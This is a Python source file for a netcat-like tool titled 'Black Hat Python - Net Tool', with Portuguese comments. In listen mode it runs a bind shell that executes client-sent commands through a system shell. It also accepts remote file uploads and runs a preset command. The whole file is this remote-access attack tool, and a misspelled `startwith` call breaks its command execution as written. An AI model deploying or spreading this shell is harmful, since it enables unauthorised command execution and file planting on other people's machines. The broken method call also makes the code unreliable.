import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading
import os



def execute(cmd):
        
    cmd = cmd.strip()   
    if not cmd:
        return ''
    
    if cmd.startwith('cd '):
        try:
            path = cmd[3:].strip()
            os.chdir(path)
            return ''
        except Exception as e:
            return f'Erro ao mudar diretório {str(e)}\n'
    
    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
        return output.decode()
    
    except subprocess.CalledProcessError as e:
        return e.output.decode()

    except Exception as e:
        return f"Erro na execução do comando: {str(e)}\n"
    
class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()
    
    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)

        try:
            while True:
                # Recebe resposta/prompt do servidor
                response = b''
                while True:
                    data = self.socket.recv(1024)
                    if not data:
                        return
                    response += data
                    # Se contém prompt, sai do loop de recepção
                    if b'#> ' in response:
                        break
                
                # Imprime resposta
                output = response.decode('utf-8', errors='ignore')
                print(output, end='', flush=True)
                
                # Pede comando do usuário e envia
                try:
                    cmd = input()
                    self.socket.send((cmd + '\n').encode('utf-8'))
                except EOFError:
                    break
        
        except ConnectionResetError:
            print('[*] Conexão resetada')
        except KeyboardInterrupt:
            print('\n[*] Interrompido')
        finally:
            self.socket.close()

    def listen(self):
        try:
            print(f'[*] Iniciando servidor em {self.args.target}:{self.args.port}...')
            self.socket.bind((self.args.target, self.args.port))
            print(f'[+] Socket binding OK!')
            
            self.socket.listen(5)
            print(f'[+] Aguardando conexões...')
            
            while True:
                print('[*] Esperando cliente...')
                client_socket, addr = self.socket.accept()
                print(f'[+] CLIENTE CONECTADO: {addr}')
                
                client_thread = threading.Thread(target=self.handle, args=(client_socket,))
                client_thread.daemon = True
                client_thread.start()
        except Exception as e:
            print(f'[!] ERRO NO SERVIDOR: {e}')
        finally:
            self.socket.close()
    
    def handle(self, client_socket):
        try:
            if self.args.execute:
                output = execute(self.args.execute)
                if output:
                    client_socket.send(output.encode('utf-8', errors='ignore'))

            elif self.args.upload:
                file_buffer = b''
                while True:
                    data = client_socket.recv(4096)
                    if data:
                        file_buffer += data
                        print(len(file_buffer))
                    else:
                        break

                with open(self.args.upload, 'wb') as f:
                    f.write(file_buffer)
                message = f'Arquivo salvo {self.args.upload}'
                client_socket.send(message.encode())

            elif self.args.command:
                print('[*] Entrando em modo comando')
                cmd_buffer = b''
                while True:
                    try:
                        # Envia prompt
                        client_socket.send(b'BHP: #> ')
                        
                        # Recebe comando até encontrar \n
                        while True:
                            data = client_socket.recv(64)
                            if not data:
                                print('[*] Cliente desconectou')
                                return
                            cmd_buffer += data
                            if b'\n' in cmd_buffer:
                                break
                        
                        # Executa comando
                        cmd_str = cmd_buffer.decode('utf-8', errors='ignore').strip()
                        print(f'[+] Comando: {cmd_str}')
                        response = execute(cmd_str)
                        
                        # Envia resposta (mesmo se vazia)
                        if response:
                            client_socket.send(response.encode('utf-8', errors='ignore'))
                        
                        # Limpa buffer de comando
                        cmd_buffer = b''
                        
                    except Exception as e:
                        print(f'[!] Erro ao processar comando: {e}')
                        break
        except Exception as e:
            print(f'[!] ERRO NO HANDLE: {e}')
        finally:
            client_socket.close()
            print('[*] Conexão fechada')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Black Hat Python - Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Exemplo:
            netcat.py -t 127.0.0.1 -p 5555 -l -c # Shell de comando
            netcat.py -t 127.0.0.1 -p 5555 -l -u=mytest.txt # Fazer upload do arquivo
            netcat.py -t 127.0.0.1 -p 5555 -l -e="whoami" # Executar comando
                               
            netcat.py -t 127.0.0.1 -p 5555 # Conectar o servidor
        '''))
    parser.add_argument('-c', '--command', action='store_true', help='Shell de comando')
    parser.add_argument('-e', '--execute', help='Executar comando especificado')
    parser.add_argument('-l', '--listen', action='store_true', help='Ouvir')
    parser.add_argument('-p', '--port', type=int, default=5555, help='Porta especificada')
    parser.add_argument('-t', '--target', default='127.0.0.1', help='IP especificado')
    parser.add_argument('-u', '--upload', help='Fazer upload do arquivo')
    args = parser.parse_args()
    
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read() if not sys.stdin.isatty() else ''

    nc = NetCat(args, buffer.encode())
    nc.run()